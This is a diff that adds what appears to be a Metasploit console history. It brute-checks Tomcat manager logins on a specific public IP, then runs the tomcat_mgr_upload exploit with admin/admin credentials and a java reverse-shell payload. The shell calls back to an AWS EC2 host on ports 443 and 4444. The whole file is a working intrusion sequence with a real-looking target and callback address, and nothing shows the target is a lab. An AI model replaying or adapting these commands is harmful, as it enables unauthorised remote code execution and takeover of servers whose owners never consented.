@@ -1,0 +1,37 @@
+use exploit/multi/http/tomcat_mgr_upload 
+show options 
+set rhosts 167.172.112.209
+set rport
+set rport 8080
+exit
+search tomcat
+use auxiliary/scanner/http/tomcat_mgr_login 
+set rhosts 167.172.112.209
+set rport 8080
+run
+use exploit/multi/http/tomcat_mgr_upload 
+exit
+use exploit/multi/http/tomcat_mgr_upload 
+show targets 
+exit
+use auxiliary/scanner/http/tomcat_mgr_login 
+options
+set rhosts 167.172.112.209
+set rport 8080
+run
+use exploit/multi/http/tomcat_mgr_upload 
+options 
+set rhosts
+set rhosts 167.172.112.209
+set rport 8080
+set HttpUsername admin
+set HttpPassword admin
+show payloads 
+set payload java/shell_reverse_tcp 
+set lhost ec2-3-237-12-166.compute-1.amazonaws.com
+set lport 443
+run
+show options 
+set lport 4444
+run
+exit
